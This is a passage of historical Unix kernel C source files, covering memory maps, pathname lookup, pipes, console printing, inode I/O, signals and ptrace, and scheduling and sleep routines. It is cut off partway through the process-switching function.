		*ap++ = 0;
		*dp++ = 0;
	}
	a = USIZE;
	while(nd >= 128) {
		*dp++ = (127<<8) | RW;
		*ap++ = a;
		a =+ 128;
		nd =- 128;
	}
	if(nd) {
		*dp++ = ((nd-1)<<8) | RW;
		*ap++ = a;
		a =+ nd;
	}
	while(ap < &u.u_uisa[8]) {
		*dp++ = 0;
		*ap++ = 0;
	}
	if(sep)
	while(ap < &u.u_uisa[16]) {
		*dp++ = 0;
		*ap++ = 0;
	}
	a =+ ns;
	while(ns >= 128) {
		a =- 128;
		ns =- 128;
		*--dp = (127<<8) | RW;
		*--ap = a;
	}
	if(ns) {
		*--dp = ((128-ns)<<8) | RW | ED;
		*--ap = a-128;
	}
	if(!sep) {
		ap = &u.u_uisa[0];
		dp = &u.u_uisa[8];
		while(ap < &u.u_uisa[8])
			*dp++ = *ap++;
		ap = &u.u_uisd[0];
		dp = &u.u_uisd[8];
		while(ap < &u.u_uisd[8])
			*dp++ = *ap++;
	}
	sureg();
	return(0);

err:
	u.u_error = ENOMEM;
	return(-1);
}

/*
 * Return the arg/128 rounded up.
 */
nseg(n)
{

	return((n+127)>>7);
}
-- /usr/sys/ken/malloc.c mode=0100664 uid=3 gid=3 atime=174921662 mtime=174843207 --
#
/*
 */

/*
 * Structure of the coremap and swapmap
 * arrays. Consists of non-zero count
 * and base address of that many
 * contiguous units.
 * (The coremap unit is 64 bytes,
 * the swapmap unit is 512 bytes)
 * The addresses are increasing and
 * the list is terminated with the
 * first zero count.
 */
struct map
{
	char *m_size;
	char *m_addr;
};

/*
 * Allocate size units from the given
 * map. Return the base of the allocated
 * space.
 * Algorithm is first fit.
 */
malloc(mp, size)
struct map *mp;
{
	register int a;
	register struct map *bp;

	for (bp = mp; bp->m_size; bp++) {
		if (bp->m_size >= size) {
			a = bp->m_addr;
			bp->m_addr =+ size;
			if ((bp->m_size =- size) == 0)
				do {
					bp++;
					(bp-1)->m_addr = bp->m_addr;
				} while ((bp-1)->m_size = bp->m_size);
			return(a);
		}
	}
	return(0);
}

/*
 * Free the previously allocated space aa
 * of size units into the specified map.
 * Sort aa into map and combine on
 * one or both ends if possible.
 */
mfree(mp, size, aa)
struct map *mp;
{
	register struct map *bp;
	register int t;
	register int a;

	a = aa;
	for (bp = mp; bp->m_addr<=a && bp->m_size!=0; bp++);
	if (bp>mp && (bp-1)->m_addr+(bp-1)->m_size == a) {
		(bp-1)->m_size =+ size;
		if (a+size == bp->m_addr) {
			(bp-1)->m_size =+ bp->m_size;
			while (bp->m_size) {
				bp++;
				(bp-1)->m_addr = bp->m_addr;
				(bp-1)->m_size = bp->m_size;
			}
		}
	} else {
		if (a+size == bp->m_addr && bp->m_size) {
			bp->m_addr =- size;
			bp->m_size =+ size;
		} else if (size) do {
			t = bp->m_addr;
			bp->m_addr = a;
			a = t;
			t = bp->m_size;
			bp->m_size = size;
			bp++;
		} while (size = t);
	}
}
-- /usr/sys/ken/nami.c mode=0100664 uid=3 gid=3 atime=174921668 mtime=174906554 --
#
#include "../param.h"
#include "../inode.h"
#include "../user.h"
#include "../systm.h"
#include "../buf.h"

/*
 * Convert a pathname into a pointer to
 * an inode. Note that the inode is locked.
 *
 * func = function called to get next char of name
 *	&uchar if name is in user space
 *	&schar if name is in system space
 * flag = 0 if name is sought
 *	1 if name is to be created
 *	2 if name is to be deleted
 */
namei(func, flag)
int (*func)();
{
	register struct inode *dp;
	register c;
	register char *cp;
	int eo, *bp;

	/*
	 * If name starts with '/' start from
	 * root; otherwise start from current dir.
	 */

	dp = u.u_cdir;
	if((c=(*func)()) == '/')
		dp = rootdir;
	iget(dp->i_dev, dp->i_number);
	while(c == '/')
		c = (*func)();
	if(c == '\0' && flag != 0) {
		u.u_error = ENOENT;
		goto out;
	}

cloop:
	/*
	 * Here dp contains pointer
	 * to last component matched.
	 */

	if(u.u_error)
		goto out;
	if(c == '\0')
		return(dp);

	/*
	 * If there is another component,
	 * dp must be a directory and
	 * must have x permission.
	 */

	if((dp->i_mode&IFMT) != IFDIR) {
		u.u_error = ENOTDIR;
		goto out;
	}
	if(access(dp, IEXEC))
		goto out;

	/*
	 * Gather up name into
	 * users' dir buffer.
	 */

	cp = &u.u_dbuf[0];
	while(c!='/' && c!='\0' && u.u_error==0) {
		if(cp < &u.u_dbuf[DIRSIZ])
			*cp++ = c;
		c = (*func)();
	}
	while(cp < &u.u_dbuf[DIRSIZ])
		*cp++ = '\0';
	while(c == '/')
		c = (*func)();
	if(u.u_error)
		goto out;

	/*
	 * Set up to search a directory.
	 */

	u.u_offset[1] = 0;
	u.u_offset[0] = 0;
	u.u_segflg = 1;
	eo = 0;
	u.u_count = ldiv(dp->i_size1, DIRSIZ+2);
	bp = NULL;

eloop:

	/*
	 * If at the end of the directory,
	 * the search failed. Report what
	 * is appropriate as per flag.
	 */

	if(u.u_count == 0) {
		if(bp != NULL)
			brelse(bp);
		if(flag==1 && c=='\0') {
			if(access(dp, IWRITE))
				goto out;
			u.u_pdir = dp;
			if(eo)
				u.u_offset[1] = eo-DIRSIZ-2; else
				dp->i_flag =| IUPD;
			return(NULL);
		}
		u.u_error = ENOENT;
		goto out;
	}

	/*
	 * If offset is on a block boundary,
	 * read the next directory block.
	 * Release previous if it exists.
	 */

	if((u.u_offset[1]&0777) == 0) {
		if(bp != NULL)
			brelse(bp);
		bp = bread(dp->i_dev,
			bmap(dp, ldiv(u.u_offset[1], 512)));
	}

	/*
	 * Note first empty directory slot
	 * in eo for possible creat.
	 * String compare the directory entry
	 * and the current component.
	 * If they do not match, go back to eloop.
	 */

	bcopy(bp->b_addr+(u.u_offset[1]&0777), &u.u_dent, (DIRSIZ+2)/2);
	u.u_offset[1] =+ DIRSIZ+2;
	u.u_count--;
	if(u.u_dent.u_ino == 0) {
		if(eo == 0)
			eo = u.u_offset[1];
		goto eloop;
	}
	for(cp = &u.u_dbuf[0]; cp < &u.u_dbuf[DIRSIZ]; cp++)
		if(*cp != cp[u.u_dent.u_name - u.u_dbuf])
			goto eloop;

	/*
	 * Here a component matched in a directory.
	 * If there is more pathname, go back to
	 * cloop, otherwise return.
	 */

	if(bp != NULL)
		brelse(bp);
	if(flag==2 && c=='\0') {
		if(access(dp, IWRITE))
			goto out;
		return(dp);
	}
	bp = dp->i_dev;
	iput(dp);
	dp = iget(bp, u.u_dent.u_ino);
	if(dp == NULL)
		return(NULL);
	goto cloop;

out:
	iput(dp);
	return(NULL);
}

/*
 * Return the next character from the
 * kernel string pointed at by dirp.
 */
schar()
{

	return(*u.u_dirp++ & 0377);
}

/*
 * Return the next character from the
 * user string pointed at by dirp.
 */
uchar()
{
	register c;

	c = fubyte(u.u_dirp++);
	if(c == -1)
		u.u_error = EFAULT;
	return(c);
}
-- /usr/sys/ken/pipe.c mode=0100664 uid=3 gid=3 atime=174921678 mtime=174843217 --
#
/*
 */

#include "../param.h"
#include "../systm.h"
#include "../user.h"
#include "../inode.h"
#include "../file.h"
#include "../reg.h"

/*
 * Max allowable buffering per pipe.
 * This is also the max size of the
 * file created to implement the pipe.
 * If this size is bigger than 4096,
 * pipes will be implemented in LARG
 * files, which is probably not good.
 */
#define	PIPSIZ	4096

/*
 * The sys-pipe entry.
 * Allocate an inode on the root device.
 * Allocate 2 file structures.
 * Put it all together with flags.
 */
pipe()
{
	register *ip, *rf, *wf;
	int r;

	ip = ialloc(rootdev);
	if(ip == NULL)
		return;
	rf = falloc();
	if(rf == NULL) {
		iput(ip);
		return;
	}
	r = u.u_ar0[R0];
	wf = falloc();
	if(wf == NULL) {
		rf->f_count = 0;
		u.u_ofile[r] = NULL;
		iput(ip);
		return;
	}
	u.u_ar0[R1] = u.u_ar0[R0];
	u.u_ar0[R0] = r;
	wf->f_flag = FWRITE|FPIPE;
	wf->f_inode = ip;
	rf->f_flag = FREAD|FPIPE;
	rf->f_inode = ip;
	ip->i_count = 2;
	ip->i_flag = IACC|IUPD;
	ip->i_mode = IALLOC;
}

/*
 * Read call directed to a pipe.
 */
readp(fp)
int *fp;
{
	register *rp, *ip;

	rp = fp;
	ip = rp->f_inode;

loop:
	/*
	 * Very conservative locking.
	 */

	plock(ip);

	/*
	 * If the head (read) has caught up with
	 * the tail (write), reset both to 0.
	 */

	if(rp->f_offset[1] == ip->i_size1) {
		if(rp->f_offset[1] != 0) {
			rp->f_offset[1] = 0;
			ip->i_size1 = 0;
			if(ip->i_mode&IWRITE) {
				ip->i_mode =& ~IWRITE;
				wakeup(ip+1);
			}
		}

		/*
		 * If there are not both reader and
		 * writer active, return without
		 * satisfying read.
		 */

		prele(ip);
		if(ip->i_count < 2)
			return;
		ip->i_mode =| IREAD;
		sleep(ip+2, PPIPE);
		goto loop;
	}

	/*
	 * Read and return
	 */

	u.u_offset[0] = 0;
	u.u_offset[1] = rp->f_offset[1];
	readi(ip);
	rp->f_offset[1] = u.u_offset[1];
	prele(ip);
}

/*
 * Write call directed to a pipe.
 */
writep(fp)
{
	register *rp, *ip, c;

	rp = fp;
	ip = rp->f_inode;
	c = u.u_count;

loop:

	/*
	 * If all done, return.
	 */

	plock(ip);
	if(c == 0) {
		prele(ip);
		u.u_count = 0;
		return;
	}

	/*
	 * If there are not both read and
	 * write sides of the pipe active,
	 * return error and signal too.
	 */

	if(ip->i_count < 2) {
		prele(ip);
		u.u_error = EPIPE;
		psignal(u.u_procp, SIGPIPE);
		return;
	}

	/*
	 * If the pipe is full,
	 * wait for reads to deplete
	 * and truncate it.
	 */

	if(ip->i_size1 == PIPSIZ) {
		ip->i_mode =| IWRITE;
		prele(ip);
		sleep(ip+1, PPIPE);
		goto loop;
	}

	/*
	 * Write what is possible and
	 * loop back.
	 */

	u.u_offset[0] = 0;
	u.u_offset[1] = ip->i_size1;
	u.u_count = min(c, PIPSIZ-u.u_offset[1]);
	c =- u.u_count;
	writei(ip);
	prele(ip);
	if(ip->i_mode&IREAD) {
		ip->i_mode =& ~IREAD;
		wakeup(ip+2);
	}
	goto loop;
}

/*
 * Lock a pipe.
 * If its already locked,
 * set the WANT bit and sleep.
 */
plock(ip)
int *ip;
{
	register *rp;

	rp = ip;
	while(rp->i_flag&ILOCK) {
		rp->i_flag =| IWANT;
		sleep(rp, PPIPE);
	}
	rp->i_flag =| ILOCK;
}

/*
 * Unlock a pipe.
 * If WANT bit is on,
 * wakeup.
 * This routine is also used
 * to unlock inodes in general.
 */
prele(ip)
int *ip;
{
	register *rp;

	rp = ip;
	rp->i_flag =& ~ILOCK;
	if(rp->i_flag&IWANT) {
		rp->i_flag =& ~IWANT;
		wakeup(rp);
	}
}
-- /usr/sys/ken/prf.c mode=0100664 uid=3 gid=3 atime=174921686 mtime=174906689 --
#
/*
 */

#include "../param.h"
#include "../seg.h"
#include "../buf.h"
#include "../conf.h"

/*
 * Address and structure of the
 * KL-11 console device registers.
 */
struct
{
	int	rsr;
	int	rbr;
	int	xsr;
	int	xbr;
};

/*
 * In case console is off,
 * panicstr contains argument to last
 * call to panic.
 */

char	*panicstr;

/*
 * Scaled down version of C Library printf.
 * Only %s %l %d (==%l) %o are recognized.
 * Used to print diagnostic information
 * directly on console tty.
 * Since it is not interrupt driven,
 * all system activities are pretty much
 * suspended.
 * Printf should not be used for chit-chat.
 */
printf(fmt,x1,x2,x3,x4,x5,x6,x7,x8,x9,xa,xb,xc)
char fmt[];
{
	register char *s;
	register *adx, c;

	adx = &x1;
loop:
	while((c = *fmt++) != '%') {
		if(c == '\0')
			return;
		putchar(c);
	}
	c = *fmt++;
	if(c == 'd' || c == 'l' || c == 'o')
		printn(*adx, c=='o'? 8: 10);
	if(c == 's') {
		s = *adx;
		while(c = *s++)
			putchar(c);
	}
	adx++;
	goto loop;
}

/*
 * Print an unsigned integer in base b.
 */
printn(n, b)
{
	register a;

	if(a = ldiv(n, b))
		printn(a, b);
	putchar(lrem(n, b) + '0');
}

/*
 * Print a character on console.
 * Attempts to save and restore device
 * status.
 * If the switches are 0, all
 * printing is inhibited.
 */
putchar(c)
{
	register rc, s;

	rc = c;
	if(SW->integ == 0)
		return;
	while((KL->xsr&0200) == 0)
		;
	if(rc == 0)
		return;
	s = KL->xsr;
	KL->xsr = 0;
	KL->xbr = rc;
	if(rc == '\n') {
		putchar('\r');
		putchar(0177);
		putchar(0177);
	}
	putchar(0);
	KL->xsr = s;
}

/*
 * Panic is called on unresolvable
 * fatal errors.
 * It syncs, prints "panic: mesg" and
 * then loops.
 */
panic(s)
char *s;
{
	panicstr = s;
	update();
	printf("panic: %s\n", s);
	for(;;)
		idle();
}

/*
 * prdev prints a warning message of the
 * form "mesg on dev x/y".
 * x and y are the major and minor parts of
 * the device argument.
 */
prdev(str, dev)
{

	printf("%s on dev %l/%l\n", str, dev.d_major, dev.d_minor);
}

/*
 * deverr prints a diagnostic from
 * a device driver.
 * It prints the device, block number,
 * and an octal word (usually some error
 * status register) passed as argument.
 */
deverror(bp, o1, o2)
int *bp;
{
	register *rbp;

	rbp = bp;
	prdev("err", rbp->b_dev);
	printf("bn%l er%o %o\n", rbp->b_blkno, o1, o2);
}
-- /usr/sys/ken/rdwri.c mode=0100664 uid=3 gid=3 atime=174921694 mtime=174843226 --
#
/*
 */

#include "../param.h"
#include "../inode.h"
#include "../user.h"
#include "../buf.h"
#include "../conf.h"
#include "../systm.h"

/*
 * Read the file corresponding to
 * the inode pointed at by the argument.
 * The actual read arguments are found
 * in the variables:
 *	u_base		core address for destination
 *	u_offset	byte offset in file
 *	u_count		number of bytes to read
 *	u_segflg	read to kernel/user
 */
readi(aip)
struct inode *aip;
{
	int *bp;
	int lbn, bn, on;
	register dn, n;
	register struct inode *ip;

	ip = aip;
	if(u.u_count == 0)
		return;
	ip->i_flag =| IACC;
	if((ip->i_mode&IFMT) == IFCHR) {
		(*cdevsw[ip->i_addr[0].d_major].d_read)(ip->i_addr[0]);
		return;
	}

	do {
		lbn = bn = lshift(u.u_offset, -9);
		on = u.u_offset[1] & 0777;
		n = min(512-on, u.u_count);
		if((ip->i_mode&IFMT) != IFBLK) {
			dn = dpcmp(ip->i_size0&0377, ip->i_size1,
				u.u_offset[0], u.u_offset[1]);
			if(dn <= 0)
				return;
			n = min(n, dn);
			if ((bn = bmap(ip, lbn)) == 0)
				return;
			dn = ip->i_dev;
		} else {
			dn = ip->i_addr[0];
			rablock = bn+1;
		}
		if (ip->i_lastr+1 == lbn)
			bp = breada(dn, bn, rablock);
		else
			bp = bread(dn, bn);
		ip->i_lastr = lbn;
		iomove(bp, on, n, B_READ);
		brelse(bp);
	} while(u.u_error==0 && u.u_count!=0);
}

/*
 * Write the file corresponding to
 * the inode pointed at by the argument.
 * The actual write arguments are found
 * in the variables:
 *	u_base		core address for source
 *	u_offset	byte offset in file
 *	u_count		number of bytes to write
 *	u_segflg	write to kernel/user
 */
writei(aip)
struct inode *aip;
{
	int *bp;
	int n, on;
	register dn, bn;
	register struct inode *ip;

	ip = aip;
	ip->i_flag =| IACC|IUPD;
	if((ip->i_mode&IFMT) == IFCHR) {
		(*cdevsw[ip->i_addr[0].d_major].d_write)(ip->i_addr[0]);
		return;
	}
	if (u.u_count == 0)
		return;

	do {
		bn = lshift(u.u_offset, -9);
		on = u.u_offset[1] & 0777;
		n = min(512-on, u.u_count);
		if((ip->i_mode&IFMT) != IFBLK) {
			if ((bn = bmap(ip, bn)) == 0)
				return;
			dn = ip->i_dev;
		} else
			dn = ip->i_addr[0];
		if(n == 512) 
			bp = getblk(dn, bn); else
			bp = bread(dn, bn);
		iomove(bp, on, n, B_WRITE);
		if(u.u_error != 0)
			brelse(bp); else
		if ((u.u_offset[1]&0777)==0)
			bawrite(bp); else
			bdwrite(bp);
		if(dpcmp(ip->i_size0&0377, ip->i_size1,
		  u.u_offset[0], u.u_offset[1]) < 0 &&
		  (ip->i_mode&(IFBLK&IFCHR)) == 0) {
			ip->i_size0 = u.u_offset[0];
			ip->i_size1 = u.u_offset[1];
		}
		ip->i_flag =| IUPD;
	} while(u.u_error==0 && u.u_count!=0);
}

/*
 * Return the logical maximum
 * of the 2 arguments.
 */
max(a, b)
char *a, *b;
{

	if(a > b)
		return(a);
	return(b);
}

/*
 * Return the logical minimum
 * of the 2 arguments.
 */
min(a, b)
char *a, *b;
{

	if(a < b)
		return(a);
	return(b);
}

/*
 * Move 'an' bytes at byte location
 * &bp->b_addr[o] to/from (flag) the
 * user/kernel (u.segflg) area starting at u.base.
 * Update all the arguments by the number
 * of bytes moved.
 *
 * There are 2 algorithms,
 * if source address, dest address and count
 * are all even in a user copy,
 * then the machine language copyin/copyout
 * is called.
 * If not, its done byte-by-byte with
 * cpass and passc.
 */
iomove(bp, o, an, flag)
struct buf *bp;
{
	register char *cp;
	register int n, t;

	n = an;
	cp = bp->b_addr + o;
	if(u.u_segflg==0 && ((n | cp | u.u_base)&01)==0) {
		if (flag==B_WRITE)
			cp = copyin(u.u_base, cp, n);
		else
			cp = copyout(cp, u.u_base, n);
		if (cp) {
			u.u_error = EFAULT;
			return;
		}
		u.u_base =+ n;
		dpadd(u.u_offset, n);
		u.u_count =- n;
		return;
	}
	if (flag==B_WRITE) {
		while(n--) {
			if ((t = cpass()) < 0)
				return;
			*cp++ = t;
		}
	} else
		while (n--)
			if(passc(*cp++) < 0)
				return;
}
-- /usr/sys/ken/sig.c mode=0110664 uid=3 gid=3 atime=174921704 mtime=174907074 --
#
/*
 */

#include "../param.h"
#include "../systm.h"
#include "../user.h"
#include "../proc.h"
#include "../inode.h"
#include "../reg.h"

/*
 * Priority for tracing
 */
#define	IPCPRI	(-1)

/*
 * Structure to access an array of integers.
 */
struct
{
	int	inta[];
};

/*
 * Tracing variables.
 * Used to pass trace command from
 * parent to child being traced.
 * This data base cannot be
 * shared and is locked
 * per user.
 */
struct
{
	int	ip_lock;
	int	ip_req;
	int	ip_addr;
	int	ip_data;
} ipc;

/*
 * Send the specified signal to
 * all processes with 'tp' as its
 * controlling teletype.
 * Called by tty.c for quits and
 * interrupts.
 */
signal(tp, sig)
{
	register struct proc *p;

	for(p = &proc[0]; p < &proc[NPROC]; p++)
		if(p->p_ttyp == tp)
			psignal(p, sig);
}

/*
 * Send the specified signal to
 * the specified process.
 */
psignal(p, sig)
int *p;
{
	register *rp;

	if(sig >= NSIG)
		return;
	rp = p;
	if(rp->p_sig != SIGKIL)
		rp->p_sig = sig;
	if(rp->p_stat > PUSER)
		rp->p_stat = PUSER;
	if(rp->p_stat == SWAIT)
		setrun(rp);
}

/*
 * Returns true if the current
 * process has a signal to process.
 * This is asked at least once
 * each time a process enters the
 * system.
 * A signal does not do anything
 * directly to a process; it sets
 * a flag that asks the process to
 * do something to itself.
 */
issig()
{
	register n;
	register struct proc *p;

	p = u.u_procp;
	if(n = p->p_sig) {
		if (p->p_flag&STRC) {
			stop();
			if ((n = p->p_sig) == 0)
				return(0);
		}
		if((u.u_signal[n]&1) == 0)
			return(n);
	}
	return(0);
}

/*
 * Enter the tracing STOP state.
 * In this state, the parent is
 * informed and the process is able to
 * receive commands from the parent.
 */
stop()
{
	register struct proc *pp, *cp;

loop:
	cp = u.u_procp;
	if(cp->p_ppid != 1)
	for (pp = &proc[0]; pp < &proc[NPROC]; pp++)
		if (pp->p_pid == cp->p_ppid) {
			wakeup(pp);
			cp->p_stat = SSTOP;
			swtch();
			if ((cp->p_flag&STRC)==0 || procxmt())
				return;
			goto loop;
		}
	exit();
}

/*
 * Perform the action specified by
 * the current signal.
 * The usual sequence is:
 *	if(issig())
 *		psig();
 */
psig()
{
	register n, p;
	register *rp;

	rp = u.u_procp;
	n = rp->p_sig;
	rp->p_sig = 0;
	if((p=u.u_signal[n]) != 0) {
		u.u_error = 0;
		if(n != SIGINS && n != SIGTRC)
			u.u_signal[n] = 0;
		n = u.u_ar0[R6] - 4;
		grow(n);
		suword(n+2, u.u_ar0[RPS]);
		suword(n, u.u_ar0[R7]);
		u.u_ar0[R6] = n;
		u.u_ar0[RPS] =& ~TBIT;
		u.u_ar0[R7] = p;
		return;
	}
	switch(n) {

	case SIGQIT:
	case SIGINS:
	case SIGTRC:
	case SIGIOT:
	case SIGEMT:
	case SIGFPT:
	case SIGBUS:
	case SIGSEG:
	case SIGSYS:
		u.u_arg[0] = n;
		if(core())
			n =+ 0200;
	}
	u.u_arg[0] = (u.u_ar0[R0]<<8) | n;
	exit();
}

/*
 * Create a core image on the file "core"
 * If you are looking for protection glitches,
 * there are probably a wealth of them here
 * when this occurs to a suid command.
 *
 * It writes USIZE block of the
 * user.h area followed by the entire
 * data+stack segments.
 */
core()
{
	register s, *ip;
	extern schar;

	u.u_error = 0;
	u.u_dirp = "core";
	ip = namei(&schar, 1);
	if(ip == NULL) {
		if(u.u_error)
			return(0);
		ip = maknode(0666);
		if(ip == NULL)
			return(0);
	}
	if(!access(ip, IWRITE) &&
	   (ip->i_mode&IFMT) == 0 &&
	   u.u_uid == u.u_ruid) {
		itrunc(ip);
		u.u_offset[0] = 0;
		u.u_offset[1] = 0;
		u.u_base = &u;
		u.u_count = USIZE*64;
		u.u_segflg = 1;
		writei(ip);
		s = u.u_procp->p_size - USIZE;
		estabur(0, s, 0, 0);
		u.u_base = 0;
		u.u_count = s*64;
		u.u_segflg = 0;
		writei(ip);
	}
	iput(ip);
	return(u.u_error==0);
}

/*
 * grow the stack to include the SP
 * true return if successful.
 */

grow(sp)
char *sp;
{
	register a, si, i;

	if(sp >= -u.u_ssize*64)
		return(0);
	si = ldiv(-sp, 64) - u.u_ssize + SINCR;
	if(si <= 0)
		return(0);
	if(estabur(u.u_tsize, u.u_dsize, u.u_ssize+si, u.u_sep))
		return(0);
	expand(u.u_procp->p_size+si);
	a = u.u_procp->p_addr + u.u_procp->p_size;
	for(i=u.u_ssize; i; i--) {
		a--;
		copyseg(a-si, a);
	}
	for(i=si; i; i--)
		clearseg(--a);
	u.u_ssize =+ si;
	return(1);
}

/*
 * sys-trace system call.
 */
ptrace()
{
	register struct proc *p;

	if (u.u_arg[2] <= 0) {
		u.u_procp->p_flag =| STRC;
		return;
	}
	for (p=proc; p < &proc[NPROC]; p++) 
		if (p->p_stat==SSTOP
		 && p->p_pid==u.u_arg[0]
		 && p->p_ppid==u.u_procp->p_pid)
			goto found;
	u.u_error = ESRCH;
	return;

    found:
	while (ipc.ip_lock)
		sleep(&ipc, IPCPRI);
	ipc.ip_lock = p->p_pid;
	ipc.ip_data = u.u_ar0[R0];
	ipc.ip_addr = u.u_arg[1] & ~01;
	ipc.ip_req = u.u_arg[2];
	p->p_flag =& ~SWTED;
	setrun(p);
	while (ipc.ip_req > 0)
		sleep(&ipc, IPCPRI);
	u.u_ar0[R0] = ipc.ip_data;
	if (ipc.ip_req < 0)
		u.u_error = EIO;
	ipc.ip_lock = 0;
	wakeup(&ipc);
}

/*
 * Code that the child process
 * executes to implement the command
 * of the parent process in tracing.
 */
procxmt()
{
	register int i;
	register int *p;

	if (ipc.ip_lock != u.u_procp->p_pid)
		return(0);
	i = ipc.ip_req;
	ipc.ip_req = 0;
	wakeup(&ipc);
	switch (i) {

	/* read user I */
	case 1:
		if (fuibyte(ipc.ip_addr) == -1)
			goto error;
		ipc.ip_data = fuiword(ipc.ip_addr);
		break;

	/* read user D */
	case 2:
		if (fubyte(ipc.ip_addr) == -1)
			goto error;
		ipc.ip_data = fuword(ipc.ip_addr);
		break;

	/* read u */
	case 3:
		i = ipc.ip_addr;
		if (i<0 || i >= (USIZE<<6))
			goto error;
		ipc.ip_data = u.inta[i>>1];
		break;

	/* write user I (for now, always an error) */
	case 4:
		if (suiword(ipc.ip_addr, 0) < 0)
			goto error;
		suiword(ipc.ip_addr, ipc.ip_data);
		break;

	/* write user D */
	case 5:
		if (suword(ipc.ip_addr, 0) < 0)
			goto error;
		suword(ipc.ip_addr, ipc.ip_data);
		break;

	/* write u */
	case 6:
		p = &u.inta[ipc.ip_addr>>1];
		if (p >= u.u_fsav && p < &u.u_fsav[25])
			goto ok;
		for (i=0; i<9; i++)
			if (p == &u.u_ar0[regloc[i]])
				goto ok;
		goto error;
	ok:
		if (p == &u.u_ar0[RPS]) {
			ipc.ip_data =| 0170000;	/* assure user space */
			ipc.ip_data =& ~0340;	/* priority 0 */
		}
		*p = ipc.ip_data;
		break;

	/* set signal and continue */
	case 7:
		u.u_procp->p_sig = ipc.ip_data;
		return(1);

	/* force exit */
	case 8:
		exit();

	default:
	error:
		ipc.ip_req = -1;
	}
	return(0);
}
-- /usr/sys/ken/slp.c mode=0110664 uid=3 gid=3 atime=174921718 mtime=174921576 --
#
/*
 */

#include "../param.h"
#include "../user.h"
#include "../proc.h"
#include "../text.h"
#include "../systm.h"
#include "../file.h"
#include "../inode.h"
#include "../buf.h"

/*
 * Give up the processor till a wakeup occurs
 * on chan, at which time the process
 * enters the scheduling queue at priority pri.
 * The most important effect of pri is that when
 * pri<0 a signal cannot disturb the sleep;
 * if pri>=0 signals will be processed.
 * Callers of this routine must be prepared for
 * premature return, and check that the reason for
 * sleeping has gone away.
 */
sleep(chan, pri)
{
	register *rp, s;

	s = PS->integ;
	rp = u.u_procp;
	if(pri >= 0) {
		if(issig())
			goto psig;
		spl6();
		rp->p_wchan = chan;
		rp->p_stat = SWAIT;
		rp->p_pri = pri;
		spl0();
		if(runin != 0) {
			runin = 0;
			wakeup(&runin);
		}
		swtch();
		if(issig())
			goto psig;
	} else {
		spl6();
		rp->p_wchan = chan;
		rp->p_stat = SSLEEP;
		rp->p_pri = pri;
		spl0();
		swtch();
	}
	PS->integ = s;
	return;

	/*
	 * If priority was low (>=0) and
	 * there has been a signal,
	 * execute non-local goto to
	 * the qsav location.
	 * (see trap1/trap.c)
	 */
psig:
	aretu(u.u_qsav);
}

/*
 * Wake up all processes sleeping on chan.
 */
wakeup(chan)
{
	register struct proc *p;
	register c, i;

	c = chan;
	p = &proc[0];
	i = NPROC;
	do {
		if(p->p_wchan == c) {
			setrun(p);
		}
		p++;
	} while(--i);
}

/*
 * Set the process running;
 * arrange for it to be swapped in if necessary.
 */
setrun(p)
{
	register struct proc *rp;

	rp = p;
	rp->p_wchan = 0;
	rp->p_stat = SRUN;
	if(rp->p_pri < curpri)
		runrun++;
	if(runout != 0 && (rp->p_flag&SLOAD) == 0) {
		runout = 0;
		wakeup(&runout);
	}
}

/*
 * Set user priority.
 * The rescheduling flag (runrun)
 * is set if the priority is higher
 * than the currently running process.
 */
setpri(up)
{
	register *pp, p;

	pp = up;
	p = (pp->p_cpu & 0377)/16;
	p =+ PUSER + pp->p_nice;
	if(p > 127)
		p = 127;
	if(p > curpri)
		runrun++;
	pp->p_pri = p;
}

/*
 * The main loop of the scheduling (swapping)
 * process.
 * The basic idea is:
 *  see if anyone wants to be swapped in;
 *  swap out processes until there is room;
 *  swap him in;
 *  repeat.
 * Although it is not remarkably evident, the basic
 * synchronization here is on the runin flag, which is
 * slept on and is set once per second by the clock routine.
 * Core shuffling therefore takes place once per second.
 *
 * panic: swap error -- IO error while swapping.
 *	this is the one panic that should be
 *	handled in a less drastic way. Its
 *	very hard.
 */
sched()
{
	struct proc *p1;
	register struct proc *rp;
	register a, n;

	/*
	 * find user to swap in
	 * of users ready, select one out longest
	 */

	goto loop;

sloop:
	runin++;
	sleep(&runin, PSWP);

loop:
	spl6();
	n = -1;
	for(rp = &proc[0]; rp < &proc[NPROC]; rp++)
	if(rp->p_stat==SRUN && (rp->p_flag&SLOAD)==0 &&
	    rp->p_time > n) {
		p1 = rp;
		n = rp->p_time;
	}
	if(n == -1) {
		runout++;
		sleep(&runout, PSWP);
		goto loop;
	}

	/*
	 * see if there is core for that process
	 */

	spl0();
	rp = p1;
	a = rp->p_size;
	if((rp=rp->p_textp) != NULL)
		if(rp->x_ccount == 0)
			a =+ rp->x_size;
	if((a=malloc(coremap, a)) != NULL)
		goto found2;

	/*
	 * none found,
	 * look around for easy core
	 */

	spl6();
	for(rp = &proc[0]; rp < &proc[NPROC]; rp++)
	if((rp->p_flag&(SSYS|SLOCK|SLOAD))==SLOAD &&
	    (rp->p_stat == SWAIT || rp->p_stat==SSTOP))
		goto found1;

	/*
	 * no easy core,
	 * if this process is deserving,
	 * look around for
	 * oldest process in core
	 */

	if(n < 3)
		goto sloop;
	n = -1;
	for(rp = &proc[0]; rp < &proc[NPROC]; rp++)
	if((rp->p_flag&(SSYS|SLOCK|SLOAD))==SLOAD &&
	   (rp->p_stat==SRUN || rp->p_stat==SSLEEP) &&
	    rp->p_time > n) {
		p1 = rp;
		n = rp->p_time;
	}
	if(n < 2)
		goto sloop;
	rp = p1;

	/*
	 * swap user out
	 */

found1:
	spl0();
	rp->p_flag =& ~SLOAD;
	xswap(rp, 1, 0);
	goto loop;

	/*
	 * swap user in
	 */

found2:
	if((rp=p1->p_textp) != NULL) {
		if(rp->x_ccount == 0) {
			if(swap(rp->x_daddr, a, rp->x_size, B_READ))
				goto swaper;
			rp->x_caddr = a;
			a =+ rp->x_size;
		}
		rp->x_ccount++;
	}
	rp = p1;
	if(swap(rp->p_addr, a, rp->p_size, B_READ))
		goto swaper;
	mfree(swapmap, (rp->p_size+7)/8, rp->p_addr);
	rp->p_addr = a;
	rp->p_flag =| SLOAD;
	rp->p_time = 0;
	goto loop;

swaper:
	panic("swap error");
}

/*
 * This routine is called to reschedule the CPU.
 * if the calling process is not in RUN state,
 * arrangements for it to restart must have
 * been made elsewhere, usually by calling via sleep.
 */
swtch()
{
	static struct proc *p;
	register i, n;
	register struct proc *rp;

	if(p == NULL)
		p = &proc[0];
	/*
	 * Remember stack of caller
	 */
	savu(u.u_rsav);
	/*
	 * Switch to scheduler's stack
	 */
	retu(proc[0].p_addr);

loop:
	runrun = 0;
	rp = p;
	p = NULL;
	n = 128;
	/*
	 * Search for highest-priority runnable process
	 */
	i = NPROC;
	do {
		rp++;
